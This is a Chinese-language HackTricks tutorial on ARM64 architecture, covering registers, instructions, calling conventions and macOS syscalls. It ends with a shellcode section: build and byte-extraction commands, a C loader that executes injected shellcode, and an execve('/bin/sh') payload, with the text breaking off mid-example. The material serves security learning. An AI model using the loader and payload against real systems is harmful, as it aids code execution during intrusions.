# ARM64v8 简介

{{#include ../../../banners/hacktricks-training.md}}


## **异常级别 - EL (ARM64v8)**

在 ARMv8 架构中，执行级别称为 Exception Levels (ELs)，用于定义执行环境的特权级别和能力。有四个异常级别，从 EL0 到 EL3，每个级别有不同用途：

1. **EL0 - 用户模式**：
- 这是最低特权级别，用于执行普通应用代码。
- 在 EL0 运行的应用彼此以及与系统软件隔离，增强了安全性和稳定性。
2. **EL1 - 操作系统内核模式**：
- 大多数操作系统内核在此级别运行。
- EL1 的特权高于 EL0，可以访问系统资源，但仍有一些限制以保证系统完整性。你可以使用 SVC 指令从 EL0 切换到 EL1。
3. **EL2 - Hypervisor 模式**：
- 此级别用于虚拟化。运行在 EL2 的 hypervisor 可以管理在同一硬件上运行的多个操作系统（每个操作系统在其各自的 EL1）。
- EL2 提供了用于隔离和控制虚拟化环境的功能。
- 因此像 Parallels 这样的虚拟机应用可以使用 `hypervisor.framework` 与 EL2 交互并运行虚拟机，而无需内核扩展。
- 要从 EL1 移动到 EL2 使用 `HVC` 指令。
4. **EL3 - Secure Monitor 模式**：
- 这是最高特权级别，通常用于安全引导和受信任执行环境。
- EL3 可以管理并控制安全和非安全状态之间的访问（例如安全引导、受信任的 OS 等）。
- 在 macOS 中它曾用于 KPP (Kernel Patch Protection)，但现在不再使用。
- Apple 不再使用 EL3。
- 通常使用 `SMC` (Secure Monitor Call) 指令切换到 EL3。

这些级别的使用提供了一种结构化且安全的方式来管理系统的不同方面，从用户应用到最有特权的系统软件。ARMv8 对特权级别的处理有助于有效隔离不同的系统组件，从而增强系统的安全性和稳健性。

## **寄存器 (ARM64v8)**

ARM64 有 **31 个通用寄存器**，标记为 `x0` 到 `x30`。每个寄存器可以存储 **64 位**（8 字节）值。对于只需 32 位的操作，可以用 `w0` 到 `w30` 访问相同的寄存器的 32 位 形式。

1. **`x0`** 到 **`x7`** - 通常用作临时寄存器并用于向子例程传递参数。
- **`x0`** 也用于携带函数的返回数据。
2. **`x8`** - 在 Linux kernel 中，`x8` 用作 `svc` 指令的系统调用号。**在 macOS 中用的是 x16！**
3. **`x9`** 到 **`x15`** - 更多的临时寄存器，常用于局部变量。
4. **`x16`** 和 **`x17`** - **过程内调用寄存器**。用于存放临时值。它们也用于间接函数调用和 PLT stub。
- **`x16`** 在 **macOS** 中用作 **`svc`** 指令的 **系统调用号**。
5. **`x18`** - **平台寄存器**。可作为通用寄存器使用，但在某些平台上此寄存器保留给平台特定用途：Windows 中指向当前线程环境块的指针，或在 linux kernel 中指向当前正在执行的 task 结构。
6. **`x19`** 到 **`x28`** - 这些是被调用者保存（callee-saved）寄存器。函数必须为其调用者保存这些寄存器的值，所以在函数调用时会存入栈并在返回前恢复。
7. **`x29`** - **帧指针**，用于跟踪栈帧。当因为函数调用创建新栈帧时，原来的 **`x29`** 会被存入栈中，新的帧指针地址（即 **`sp`** 的值）会存入该寄存器。
- 该寄存器也可以用作通用寄存器，但通常用作对局部变量的引用。
8. **`x30`** 或 **`lr`** - **链接寄存器**。当执行 `BL`（Branch with Link）或 `BLR`（Branch with Link to Register）指令时，它保存返回地址（即 `pc` 的值）。
- 它也可以像其他寄存器一样使用。
- 如果当前函数将调用另一个函数从而覆盖 `lr`，它会在开始时将其存入栈，这就是函数的 prologue（例如 `stp x29, x30 , [sp, #-48]; mov x29, sp` -> 存储 `fp` 和 `lr`，为新帧生成空间并设置新的 `fp`），并在结束时恢复，这是 epilogue（例如 `ldp x29, x30, [sp], #48; ret` -> 恢复 `fp` 和 `lr` 并返回）。
9. **`sp`** - **栈指针**，用于跟踪栈顶位置。
- **`sp`** 的值应至少保持四字（quadword）对齐，否则可能会发生对齐异常。
10. **`pc`** - **程序计数器**，指向下一条指令。该寄存器只能通过产生异常、异常返回和分支来更新。唯一能读取该寄存器的普通指令是带链接的分支指令（BL、BLR），它们会将 **`pc`** 地址存入 **`lr`**（Link Register）。
11. **`xzr`** - **零寄存器**。在 32 位形式中称为 **`wzr`**。可用于方便地获得零值（常见操作），或使用 **`subs`** 进行比较，例如 **`subs XZR, Xn, #10`**，结果不会被存储（存入 **`xzr`**）。

**`Wn`** 寄存器是 **`Xn`** 寄存器的 **32 位** 版本。

> [!TIP]
> 从 X0 到 X18 的寄存器是易失的（volatile），意味着它们的值可能会被函数调用和中断更改。然而从 X19 到 X28 的寄存器是非易失的（non-volatile），也就是它们的值必须在函数调用间被保留（被调用者保存）。

### SIMD 和浮点寄存器

此外还有 **32 个 128 位** 的寄存器，可用于优化的单指令多数据（SIMD）操作和浮点运算。这些称为 Vn 寄存器，但它们也可以以 **64 位**、**32 位**、**16 位** 和 **8 位** 形式操作，分别称为 **`Qn`**、**`Dn`**、**`Sn`**、**`Hn`** 和 **`Bn`**。

### 系统寄存器

**有数百个系统寄存器**，也称为特殊用途寄存器（SPRs），用于**监控**和**控制**处理器行为。\
它们只能使用专用指令 **`mrs`** 和 **`msr`** 读取或设置。

特殊寄存器 **`TPIDR_EL0`** 和 **`TPIDDR_EL0`** 在逆向工程中常见。后缀 `EL0` 表示从哪个最低异常级别可以访问该寄存器（在本例中 EL0 是常规程序运行的权限级别）。\
它们通常用于存储线程局部存储（TLS）区域的基地址。通常第一个对 EL0 下的程序可读写，但第二个可以从 EL0 读取并从 EL1（例如内核）写入。

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** 包含若干进程组件，这些组件被序列化到操作系统可见的 **`SPSR_ELx`** 特殊寄存器中，其中 X 表示触发异常的**权限级别**（这允许在异常结束时恢复进程状态）。\
以下是可访问的字段：

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- 条件标志 **`N`**、**`Z`**、**`C`** 和 **`V`**：
- **`N`** 表示运算结果为负。
- **`Z`** 表示运算结果为零。
- **`C`** 表示发生了进位（carry）。
- **`V`** 表示发生有符号溢出（signed overflow）：
- 两个正数相加得到负数。
- 两个负数相加得到正数。
- 在减法中，当从较小的正数中减去一个很大的负数（或反之），结果无法在给定位宽内表示时会发生。
- 处理器并不知道运算是否为有符号或无符号，因此它会在运算中检查 C 和 V，并在发生进位时指示（无论该运算是有符号还是无符号）。

> [!WARNING]
> 并非所有指令都会更新这些标志。像 **`CMP`** 或 **`TST`** 这样的指令会更新，而带有 s 后缀的指令（例如 **`ADDS`**）也会更新标志。

- 当前 **寄存器宽度（`nRW`）标志**：如果该标志为 0，程序在恢复时将以 AArch64 执行状态运行。
- 当前 **异常级别（`EL`）**：在 EL0 运行的常规程序该值为 0。
- **单步执行（`SS`）** 标志：调试器可通过在异常中将 `SPSR_ELx` 的 SS 标志置为 1 来实现单步。程序执行一步后会触发单步异常。
- **非法异常状态（`IL`）** 标志：用于标记当特权软件执行无效的异常级别切换时，将该标志置为 1 并触发非法状态异常。
- **`DAIF`** 标志：这些标志允许特权程序有选择地屏蔽某些外部异常。
- 如果 **`A`** 为 1，表示会触发 **asynchronous aborts**。**`I`** 配置响应外部硬件中断请求（IRQs）。`F` 与 **Fast Interrupt Requests (FIQ)** 相关。
- **栈指针选择（`SPS`）** 标志：在 EL1 及更高特权下运行的程序可以在使用自己的栈指针寄存器和用户模式栈指针之间切换（例如在 `SP_EL1` 与 `EL0` 之间）。这种切换通过写入 **`SPSel`** 特殊寄存器来完成。EL0 无法执行此操作。

## **调用约定 (ARM64v8)**

ARM64 的调用约定规定函数的**前八个参数**通过寄存器 **`x0` 到 `x7`** 传递。**额外**参数通过**栈**传递。返回值放在寄存器 **`x0`** 中返回，若返回值为 128 位则也会使用 **`x1`**。寄存器 **`x19`** 到 **`x30`** 以及 **`sp`** 必须在函数调用间**被保留**。

在阅读汇编函数时，注意寻找**函数的 prologue 和 epilogue**。**prologue** 通常涉及**保存帧指针（`x29`）**、**设置新的帧指针**以及**分配栈空间**。**epilogue** 通常涉及**恢复保存的帧指针**并**从函数返回**。

### Swift 的调用约定

Swift 有其自己的 **调用约定**，可以在以下位置找到：[**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **常用指令 (ARM64v8)**

ARM64 指令通常具有 **格式 `opcode dst, src1, src2`**，其中 **`opcode`** 是要执行的操作（例如 `add`、`sub`、`mov` 等），**`dst`** 是存放结果的目标寄存器，**`src1`** 和 **`src2`** 是源寄存器。立即数也可以用作源。

- **`mov`**：将一个 **寄存器** 的值**移动**到另一个寄存器。
- 例：`mov x0, x1` — 将 `x1` 的值移动到 `x0`。
- **`ldr`**：从 **内存** 将值 **加载** 到 **寄存器**。
- 例：`ldr x0, [x1]` — 从由 `x1` 指向的内存位置加载值到 `x0`。
- **偏移模式（Offset mode）**：对源指针的偏移用法，例如：
- `ldr x2, [x1, #8]`，这将在 x2 加载来自 x1 + 8 的值。
- `ldr x2, [x0, x1, lsl #2]`，这将在 x2 加载来自数组 x0 的对象，位置为 x1（索引）\*4。
- **预索引模式（Pre-indexed mode）**：对源地址应用计算，获取结果，并将新地址写回源寄存器。
- `ldr x2, [x1, #8]!`，这会将 `x1 + 8` 加载到 `x2` 并将 `x1` 更新为 `x1 + 8`。
- `str lr, [sp, #-4]!`，将链接寄存器存入 sp 并更新寄存器 sp。
- **后索引模式（Post-index mode）**：类似于上面，但先访问内存地址然后计算并存储偏移。
- `ldr x0, [x1], #8`，将 `x1` 的内容加载到 `x0`，然后用 `x1 + 8` 更新 `x1`。
- **基于 PC 的寻址（PC-relative addressing）**：要加载的地址相对于 PC 计算。
- `ldr x1, =_start`，这会将与当前 PC 相关的 `_start` 符号所在地址加载到 x1。
- **`str`**：将寄存器的值 **存储** 到 **内存**。
- 例：`str x0, [x1]` — 将 `x0` 的值存储到 `x1` 指向的内存位置。
- **`ldp`**：**加载成对寄存器**。该指令从连续的内存位置加载两个寄存器。内存地址通常由另一个寄存器的值加偏移形成。
- 例：`ldp x0, x1, [x2]` — 从内存地址 `x2` 和 `x2 + 8` 分别加载到 `x0` 和 `x1`。
- **`stp`**：**存储成对寄存器**。将两个寄存器存到连续的内存位置。地址通常由另一个寄存器加偏移形成。
- 例：`stp x0, x1, [sp]` — 将 `x0` 和 `x1` 存到 `sp` 和 `sp + 8`。
- `stp x0, x1, [sp, #16]!` — 将 `x0` 和 `x1` 存到 `sp+16` 和 `sp+24`，并将 `sp` 更新为 `sp+16`。
- **`add`**：将两个寄存器的值相加并将结果存入寄存器。
- 语法： add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> 目标
- Xn2 -> 操作数 1
- Xn3 | #imm -> 操作数 2（寄存器或立即数）
- \[shift #N | RRX] -> 执行移位或 RRX
- 例：`add x0, x1, x2` — 将 `x1` 和 `x2` 的值相加并存入 `x0`。
- `add x5, x5, #1, lsl #12` — 这等于 4096（将 1 左移 12 位）-> 1 0000 0000 0000 0000
- **`adds`**：执行 `add` 并更新条件标志。
- **`sub`**：将两个寄存器的值相减并将结果存入寄存器。
- 语法同 **`add`**。
- 例：`sub x0, x1, x2` — 将 `x2` 从 `x1` 中减去并将结果存入 `x0`。
- **`subs`**：与 `sub` 类似，但更新标志。
- **`mul`**：将两个寄存器的值相乘并将结果存入寄存器。
- 例：`mul x0, x1, x2` — 将 `x1` 和 `x2` 相乘并将结果存入 `x0`。
- **`div`**：将一个寄存器的值除以另一个并将结果存入寄存器。
- 例：`div x0, x1, x2` — 将 `x1` 除以 `x2` 并将结果存入 `x0`。
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**：
- **逻辑左移（lsl）**：在尾端补 0，将其他位向前移动（相当于乘以 2 的 n 次方）。
- **逻辑右移（lsr）**：在前端补 0，将其他位向后移动（对无符号数相当于除以 2 的 n 次方）。
- **算术右移（asr）**：类似 `lsr`，但如果最高有效位为 1，则在前端补 1（对有符号数相当于除以 2 的 n 次方）。
- **右旋（ror）**：类似 `lsr`，但被移出的位被追加到左端。
- **带扩展的右旋（rrx）**：类似 `ror`，但使用进位标志作为“最高有效位”。因此进位标志移动到第 31 位，被移出的位进入进位标志。
- **`bfm`**：Bit Field Move，将值的位 `0...n` 复制并放置到位置 `m..m+n`。`#s` 指定左边界位位置，`#r` 指定向右旋转量。
- Bitfield move: `BFM Xd, Xn, #r`
- 有符号位域移动: `SBFM Xd, Xn, #r, #s`
- 无符号位域移动: `UBFM Xd, Xn, #r, #s`
- **位域提取与插入（Bitfield Extract and Insert）**：从寄存器复制一段位域并插入到另一个寄存器。
- **`BFI X1, X2, #3, #4`** 从 X2 的第 3 位开始插入 4 位到 X1。
- **`BFXIL X1, X2, #3, #4`** 从 X2 的第 3 位提取 4 位并复制到 X1。
- **`SBFIZ X1, X2, #3, #4`** 从 X2 的第 3 位起对 4 位做符号扩展并插入到 X1 的相应位置，同时将右侧位清零。
- **`SBFX X1, X2, #3, #4`** 从 X2 的第 3 位起提取 4 位，做符号扩展后放入 X1。
- **`UBFIZ X1, X2, #3, #4`** 从 X2 的第 3 位起对 4 位做零扩展并插入到 X1 的相应位置，同时将右侧位清零。
- **`UBFX X1, X2, #3, #4`** 从 X2 的第 3 位起提取 4 位并将零扩展的结果放入 X1。
- **有符号扩展到 X（Sign Extend To X）**：将值的符号扩展（或在无符号版本中补 0）以便进行运算：
- **`SXTB X1, W2`** 将来自 W2 的字节符号扩展到 X1（将 W2 扩展为 64 位）。
- **`SXTH X1, W2`** 将来自 W2 的 16 位数符号扩展到 X1（扩展为 64 位）。
- **`SXTW X1, W2`** 将来自 W2 的 32 位数符号扩展到 X1（扩展为 64 位）。
- **`UXTB X1, W2`** 将来自 W2 的字节零扩展到 X1（扩展为 64 位）。
- **`extr`**：从指定的寄存器对（按顺序连接）中提取位。
- 例：`EXTR W3, W2, W1, #3` 将 `W1+W2` 连接并从 W2 的第 3 位到 W1 的第 3 位提取，存入 W3。
- **`cmp`**：比较两个寄存器并设置条件标志。它是 `subs` 的别名，将目标寄存器设为零寄存器。用于判断 `m == n`。
- 支持与 `subs` 相同的语法。
- 例：`cmp x0, x1` — 比较 `x0` 和 `x1` 的值并相应设置条件标志。
- **`cmn`**：比较与被比较数相反。此指令是 `adds` 的别名，支持相同语法。用于判断 `m == -n`。
- **`ccmp`**：条件比较，仅当先前的比较满足指定条件时执行并设置 nzcv 位。
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> 如果 x1 != x2 且 x3 < x4，则跳转到 func。
- 这是因为 **`ccmp`** 只会在先前的 `cmp` 为 `NE` 时执行，否则 nzcv 位会被设置为 0（这不会满足 `blt` 的条件）。
- 这也可用作 `ccmn`（与 `cmp` vs `cmn` 的关系相同）。
- **`tst`**：检查按位与后的结果是否为非零（类似执行 ANDS 但不存储结果）。用于检查寄存器中是否存在指定掩码的任一位为 1。
- 例：`tst X1, #7` 检查 X1 的最低三位是否有任意为 1。
- **`teq`**：执行 XOR 并丢弃结果（只更新标志）。
- **`b`**：无条件分支。
- 例：`b myFunction`
- 注意这不会把返回地址填入链接寄存器（不适合需要返回的子程序调用）。
- **`bl`**：带链接的分支，用于调用子程序。将返回地址存入 `x30`。
- 例：`bl myFunction` — 调用 `myFunction` 并将返回地址存入 `x30`。
- **`blr`**：将链接分支到寄存器，用于调用目标地址在寄存器中的子程序。将返回地址存入 `x30`。
- 例：`blr x1` — 调用 `x1` 中存储地址对应的函数并将返回地址存入 `x30`。
- **`ret`**：从子程序返回，通常使用 `x30` 中的地址。
- 例：`ret` — 使用 `x30` 中的返回地址从当前子程序返回。
- **`b.<cond>`**：条件分支。
- **`b.eq`**：若相等则分支，基于之前的 `cmp` 指令。
- 例：`b.eq label` — 若之前的 `cmp` 检测到相等则跳转到 `label`。
- **`b.ne`**：若不等则分支。该指令检查条件标志（由之前的比较指令设置），若不相等则分支到标签或地址。
- 例：在 `cmp x0, x1` 后，`b.ne label` — 若 `x0` 与 `x1` 不相等则跳转到 `label`。
- **`cbz`**：比较并在为零时分支。比较寄存器与零，若相等则分支。
- 例：`cbz x0, label` — 若 `x0` 为零则跳转到 `label`。
- **`cbnz`**：比较并在非零时分支。比较寄存器与零，若不相等则分支。
- 例：`cbnz x0, label` — 若 `x0` 非零则跳转到 `label`。
- **`tbnz`**：测试位并在非零时分支。
- 例：`tbnz x0, #8, label`
- **`tbz`**：测试位并在为零时分支。
- 例：`tbz x0, #8, label`
- **条件选择操作（Conditional select operations）**：根据条件位的值选择不同的行为。
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> 如果为真，X0 = X1，否则 X0 = X2
- `csinc Xd, Xn, Xm, cond` -> 如果为真，Xd = Xn，否则 Xd = Xm + 1
- `cinc Xd, Xn, cond` -> 如果为真，Xd = Xn + 1，否则 Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> 如果为真，Xd = Xn，否则 Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> 如果为真，Xd = NOT(Xn)，否则 Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> 如果为真，Xd = Xn，否则 Xd = - Xm
- `cneg Xd, Xn, cond` -> 如果为真，Xd = - Xn，否则 Xd = Xn
- `cset Xd, Xn, Xm, cond` -> 如果为真，Xd = 1，否则 Xd = 0
- `csetm Xd, Xn, Xm, cond` -> 如果为真，Xd = \<all 1>，否则 Xd = 0
- **`adrp`**：计算符号的页地址并存入寄存器。
- 例：`adrp x0, symbol` — 计算 `symbol` 的页地址并存入 `x0`。
- **`ldrsw`**：从内存加载带符号的 32 位值并符号扩展到 64 位。常用于 SWITCH 分支表。
- 例：`ldrsw x0, [x1]` — 从 `x1` 指向的内存位置加载带符号的 32 位值，符号扩展到 64 位并存入 `x0`。
- **`stur`**：使用另一个寄存器的偏移将寄存器值存储到内存位置。
- 例：`stur x0, [x1, #4]` — 将 `x0` 的值存储到地址为 `x1 + 4` 的内存位置。
- **`svc`**：发起系统调用（Supervisor Call）。当处理器执行该指令时，会从用户模式切换到内核模式并跳转到内核的系统调用处理代码所在位置。

- 例：

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **函数 Prologue**

1. **将链接寄存器和帧指针保存到栈**：
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **设置新的帧指针**: `mov x29, sp` (为当前函数设置新的帧指针)
3. **在栈上为本地变量分配空间** (如有需要): `sub sp, sp, <size>` (其中 `<size>` 是所需的字节数)

### **函数尾部**

1. **释放已分配的本地变量（如果有）**: `add sp, sp, <size>`
2. **恢复链接寄存器和帧指针**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` （使用链接寄存器中的地址将控制权返回给调用者）

## ARM 常见内存保护

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## AARCH32 执行状态

Armv8-A 支持 32 位程序的执行。**AArch32** 可以在 **两种指令集** 之一运行：**`A32`** 和 **`T32`**，并且可以通过 **`interworking`** 在它们之间切换。  
具有**特权**的 64 位程序可以通过将异常级别转移到较低特权的 32 位来安排 32 位程序的执行。  
注意，从 64 位到 32 位的转换发生在较低的异常级别（例如，位于 EL1 的 64 位程序触发位于 EL0 的程序）。当 `AArch32` 进程线程准备执行时，通过将特殊寄存器 **`SPSR_ELx`** 的第 4 位设置为 **1** 来完成此操作，`SPSR_ELx` 的其余部分保存 `AArch32` 程序的 CPSR。然后，特权进程调用 **`ERET`** 指令，使处理器转换为 **`AArch32`**，并根据 CPSR 进入 A32 或 T32。

**`interworking`** 是通过 CPSR 的 J 和 T 位来实现的。`J=0` 且 `T=0` 表示 **`A32`**，`J=0` 且 `T=1` 表示 **T32**。这基本上意味着将**最低位设为 1**以指示指令集为 T32。  
这会在**interworking 分支指令**期间设置，但当将 PC 设为目标寄存器时，也可以通过其他指令直接设置。示例：

另一个示例：
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### 寄存器

共有 16 个 32 位寄存器 (r0-r15)。 **From r0 to r14** 可用于 **任何操作**，不过其中有些通常被保留：

- **`r15`**: 程序计数器（始终）。包含下一条指令的地址。在 A32 中为当前地址 + 8，在 T32 中为当前地址 + 4。
- **`r11`**: 帧指针
- **`r12`**: 程序内调用寄存器
- **`r13`**: 栈指针（注意栈始终按 16 字节对齐）
- **`r14`**: 链接寄存器

此外，寄存器在 **`banked registries`** 中有备份。它们用于保存寄存器值，从而在异常处理和特权操作中执行 **快速上下文切换**，避免每次都需要手动保存和恢复寄存器。\
这是通过 **将处理器状态从 `CPSR` 保存到 `SPSR`**（针对发生异常的处理器模式）来完成的。在异常返回时，**`CPSR`** 会从 **`SPSR`** 恢复。

### CPSR - 当前程序状态寄存器

在 AArch32 中，CPSR 的作用类似于 AArch64 中的 **`PSTATE`**，并且在发生异常时也会存储到 **`SPSR_ELx`** 以便稍后恢复执行：

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

这些字段被分成若干组：

- Application Program Status Register (APSR)：算术标志，可从 EL0 访问
- Execution State Registers：处理器执行行为（由操作系统管理）

#### 应用程序状态寄存器 (APSR)

- **`N`**, **`Z`**, **`C`**, **`V`** 标志（与 AArch64 相同）
- **`Q`** 标志：当执行某些专门的饱和算术指令时，如果发生 **整数饱和**，该标志会被置为 1。一旦被设置为 **`1`**，它将保持该值直至手动置为 0。此外，没有任何指令会隐式检查其值，必须手动读取来判断。
- **`GE`**（大于等于）标志：用于 SIMD (Single Instruction, Multiple Data) 操作，例如“parallel add”和“parallel subtract”。这些操作允许在单条指令中处理多个数据点。

例如，**`UADD8`** 指令会对两个 32 位操作数中的四对字节并行相加，并将结果存入一个 32 位寄存器。它随后会根据这些结果 **设置 `APSR` 中的 `GE` 标志**。每个 GE 标志对应一个字节相加，指示该字节对的加法是否发生了 **溢出**。

**`SEL`** 指令使用这些 GE 标志来执行条件操作。

#### 执行状态寄存器

- **`J`** 和 **`T`** 位：**`J`** 应为 0；如果 **`T`** 为 0 则使用指令集 A32，若为 1 则使用 T32。
- IT Block State Register (`ITSTATE`)：这些位位于 10-15 和 25-26。它们存储带有 **`IT`** 前缀组内指令的条件。
- **`E`** 位：表示字节序（endianness）。
- 模式和异常屏蔽位 (0-4)：它们决定当前的执行状态。第 **5** 位指示程序是以 32bit（为 1）还是 64bit（为 0）运行。其他 4 位表示 **当前使用的异常模式**（当发生异常并被处理时）。所设置的数值 **表示当前优先级**，以防在处理期间触发另一个异常。

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**：可以使用位 **`A`**、`I`、`F` 来禁用某些异常。如果 **`A`** 为 1，表示将触发 **异步中止（asynchronous aborts）**。**`I`** 用于配置是否响应外部硬件 **Interrupts Requests** (IRQs)。而 `F` 则与 **Fast Interrupt Requests** (FIRs) 相关。

## macOS

### BSD syscalls

查看 [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) 或运行 `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`。BSD syscalls 的 **x16 > 0**。

### Mach Traps

在 [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) 中查看 `mach_trap_table`，并在 [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) 中查看原型。Mach traps 的最大数量是 `MACH_TRAP_TABLE_COUNT` = 128。Mach traps 的 **x16 < 0**，因此你需要对前面的列表中的编号取 **负值**：**`_kernelrpc_mach_vm_allocate_trap`** 是 **`-10`**。

你也可以在反汇编器中检查 **`libsystem_kernel.dylib`** 来找到如何调用这些（以及 BSD）syscalls：
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Note that **Ida** and **Ghidra** can also decompile **specific dylibs** from the cache just by passing the cache.

> [!TIP]
> 有时更容易检查来自 **decompiled** 的 **`libsystem_kernel.dylib`** 代码，**than** 检查 **source code**，因为多个 syscalls (BSD and Mach) 的代码是通过脚本生成的（查看源代码中的注释），而在 dylib 中你可以找到实际被调用的内容。

### machdep 调用

XNU 支持另一类称为 machine dependent 的调用。这些调用的编号取决于架构，而且调用名或编号都不保证保持不变。

### comm page

这是一个由内核拥有的内存页，会被映射到每个用户进程的地址空间中。它用于为那些被频繁使用的内核服务加速从 user mode 到 kernel space 的切换——对于极其频繁的服务，通过 syscalls 切换会非常低效。

例如调用 `gettimeofdate` 会直接从 comm page 中读取 `timeval` 的值。

### objc_msgSend

在 Objective-C 或 Swift 程序中非常常见会使用到这个函数。该函数用于调用 Objective-C 对象的方法。

Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> 指向实例的指针
- x1: op -> 方法的 Selector
- x2... -> 被调用方法的其余参数

因此，如果你在跳转到该函数之前设置断点，就可以在 lldb 中轻松找出被调用的内容（在此示例中，对象调用了来自 `NSConcreteTask` 的一个对象，它将运行一个命令）：
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> 设置环境变量 **`NSObjCMessageLoggingEnabled=1`**，可以在类似 `/tmp/msgSends-pid` 的文件中记录 (log) 当此函数被调用的情况。
>
> 此外，设置 **`OBJC_HELP=1`** 并运行任意二进制文件，你可以看到其他可以用来在某些 Objc-C 操作发生时进行记录 (log) 的环境变量。

当调用此函数时，需要找到所指定实例被调用的方法，为此会进行以下不同的查找：

- Perform optimistic cache lookup:
- If successful, done
- Acquire runtimeLock (read)
- If (realize && !cls->realized) realize class
- If (initialize && !cls->initialized) initialize class
- Try class own cache:
- If successful, done
- Try class method list:
- If found, fill cache and done
- Try superclass cache:
- If successful, done
- Try superclass method list:
- If found, fill cache and done
- If (resolver) try method resolver, and repeat from class lookup
- If still here (= all else has failed) try forwarder

### Shellcodes

编译：
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
要提取字节：
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
对于较新的 macOS：
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>用于测试 shellcode 的 C 代码</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

摘自 [**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) 并解释。

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
